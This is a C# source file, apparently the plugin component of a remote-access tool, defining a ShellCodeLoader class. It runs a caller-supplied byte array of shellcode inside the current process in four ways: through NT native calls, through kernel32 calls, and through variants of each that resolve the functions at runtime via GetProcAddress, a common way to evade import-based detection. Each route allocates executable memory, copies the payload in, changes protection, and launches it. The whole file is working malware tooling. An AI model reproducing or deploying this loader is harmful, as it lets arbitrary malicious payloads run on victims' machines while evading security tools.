using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    class ShellCodeLoader : IDisposable
    {
        private byte[] ShellCode;
        private IntPtr ptr;
        private uint RegionSize;
        /// <summary>
        /// Default is false.
        /// </summary>
        public bool Asynchronous { get; set; }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void ShellCodeCaller();

        public ShellCodeLoader(byte[] shellCode)
        {
            this.ShellCode = shellCode;
            this.RegionSize = (uint)shellCode.Length;
            this.ptr = IntPtr.Zero;
            this.Asynchronous = false;
        }

        public void LoadWithNT()
        {

            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { NT(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
                //Replace Task.Run with Task.Factory.StartNew for .net 4
                /*Task.Run(() =>
                {
                    NT();
                });*/
            }
            else
            {
                NT();
            }
        }

        public void LoadWithKernel32()
        {
            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { Kernel32(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
            }
            else
            {
                Kernel32();
            }
        }

        public void LoadWithNTDelegates()
        {
            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { NTDelegates(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);

            }
            else
            {
                NTDelegates();
            }
        }

        public void LoadWithKernel32Delegates()
        {
            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { Kernel32Delegates(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
            }
            else
            {
                Kernel32Delegates();
            }
        }

        private void NT()
        {
            Imports.NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
            UIntPtr bytesWritten;
            Imports.NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
            Imports.PageProtection flOld = new Imports.PageProtection();
            Imports.NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, ref flOld);

            /*ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            load();*/

            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfao = IntPtr.Zero;
            hThread = Imports.CreateThread(0, 0, ptr, pinfao, 0, ref threadId);
            Imports.WaitForSingleObject(hThread, 0xFFFFFFFF);
            Imports.NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.FreeType.MEM_RELEASE);

            //
        }

        private void Kernel32()
        {
            this.ptr = Imports.VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
            UIntPtr writtenBytes;
            Imports.WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
            Imports.PageProtection flOld;
            Imports.VirtualProtect(ptr, RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, out flOld);
            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            load();
            Imports.VirtualFree(ptr, (uint)0, Imports.FreeType.MEM_RELEASE);
        }

        private void NTDelegates()
        {
            IntPtr ExportedNtAllocateVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtAllocateVirtualMemory");
            Imports.Delegates.NtAllocateVirtualMemory NtAllocateVirtualMemory = (Imports.Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtAllocateVirtualMemory, typeof(Imports.Delegates.NtAllocateVirtualMemory));
            NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            IntPtr ExportedNtWriteVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtWriteVirtualMemory");
            Imports.Delegates.NtWriteVirtualMemory NtWriteVirtualMemory = (Imports.Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtWriteVirtualMemory, typeof(Imports.Delegates.NtWriteVirtualMemory));
            NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);

            Imports.PageProtection flOld = new Imports.PageProtection();
            IntPtr ExportedNtProtectVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtProtectVirtualMemory");
            Imports.Delegates.NtProtectVirtualMemory NtProtectVirtualMemory = (Imports.Delegates.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtProtectVirtualMemory, typeof(Imports.Delegates.NtProtectVirtualMemory));
            NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, ref flOld);

            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            load();

            IntPtr ExportedNtFreeVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtFreeVirtualMemory");
            Imports.Delegates.NtFreeVirtualMemory NtFreeVirtualMemory = (Imports.Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtFreeVirtualMemory, typeof(Imports.Delegates.NtFreeVirtualMemory));
            NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.FreeType.MEM_RELEASE);
        }

        private void Kernel32Delegates()
        {
            IntPtr ExportedVirtualAlloc = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualAlloc");
            Imports.Delegates.VirtualAlloc VirtualAlloc = (Imports.Delegates.VirtualAlloc)Marshal.GetDelegateForFunctionPointer(ExportedVirtualAlloc, typeof(Imports.Delegates.VirtualAlloc));
            this.ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);

            UIntPtr writtenBytes;
            IntPtr ExportedWriteProcessMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "WriteProcessMemory");
            Imports.Delegates.WriteProcessMemory WriteProcessMemory = (Imports.Delegates.WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(ExportedWriteProcessMemory, typeof(Imports.Delegates.WriteProcessMemory));
            WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);

            Imports.PageProtection flOld;
            IntPtr ExportedVirtualProtect = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualProtect");
            Imports.Delegates.VirtualProtect VirtualProtect = (Imports.Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(ExportedVirtualProtect, typeof(Imports.Delegates.VirtualProtect));
            VirtualProtect(ptr, RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, out flOld);

            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            load();

            IntPtr ExportedVirtualFree = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualFree");
            Imports.Delegates.VirtualFree VirtualFree = (Imports.Delegates.VirtualFree)Marshal.GetDelegateForFunctionPointer(ExportedVirtualFree, typeof(Imports.Delegates.VirtualFree));
            Imports.VirtualFree(ptr, (uint)0, Imports.FreeType.MEM_RELEASE);
        }

        private static class Imports
        {

            internal const String KERNEL32 = "kernel32.dll";
            internal const String NTDLL = "ntdll.dll";

            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);

            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr GetCurrentProcess();
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr VirtualAlloc(IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

            [DllImport(KERNEL32)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport(KERNEL32)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport(KERNEL32)]
            public static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds);
            [DllImport(KERNEL32)]
            public static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32 dwStackSize,IntPtr lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);

            public enum PageProtection : uint
            {
                PAGE_EXECUTE = 0x10,
                PAGE_EXECUTE_READ = 0x20,
                PAGE_EXECUTE_READWRITE = 0x40,
                PAGE_EXECUTE_WRITECOPY = 0x80,
                PAGE_NOACCESS = 0x01,
                PAGE_READONLY = 0x02,
                PAGE_READWRITE = 0x04,
                PAGE_WRITECOPY = 0x08,
                PAGE_TARGETS_INVALID = 0x40000000,
                PAGE_TARGETS_NO_UPDATE = 0x40000000,
                PAGE_GUARD = 0x100,
                PAGE_NOCACHE = 0x200,
                PAGE_WRITECOMBINE = 0x400
            }
            public enum TypeAlloc : uint
            {
                MEM_COMMIT = 0x00001000,
                MEM_RESERVE = 0x00002000,
                MEM_RESET = 0x00080000,
                MEM_RESET_UNDO = 0x1000000,
                MEM_LARGE_PAGES = 0x20000000,
                MEM_PHYSICAL = 0x00400000,
                MEM_TOP_DOWN = 0x00100000,
                MEM_WRITE_WATCH = 0x00200000
            }
            public enum FreeType : uint
            {
                MEM_DECOMMIT = 0x00004000,
                MEM_RELEASE = 0x00008000,
                MEM_COALESCE_PLACEHOLDERS = 0x00000001,
                MEM_PRESERVE_PLACEHOLDER = 0x00000002
            }

            internal static class Delegates
            {
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate IntPtr VirtualAlloc(IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
            }
        }

        private bool _disposed = false;

        // Instantiate a SafeHandle instance.
        private SafeHandle _safeHandle = new SafeFileHandle(IntPtr.Zero, true);

        // Public implementation of Dispose pattern callable by consumers.
        public void Dispose() => Dispose(true);

        // Protected implementation of Dispose pattern.
        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
            {
                return;
            }

            if (disposing)
            {
                // Dispose managed state (managed objects).
                _safeHandle?.Dispose();
            }

            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}
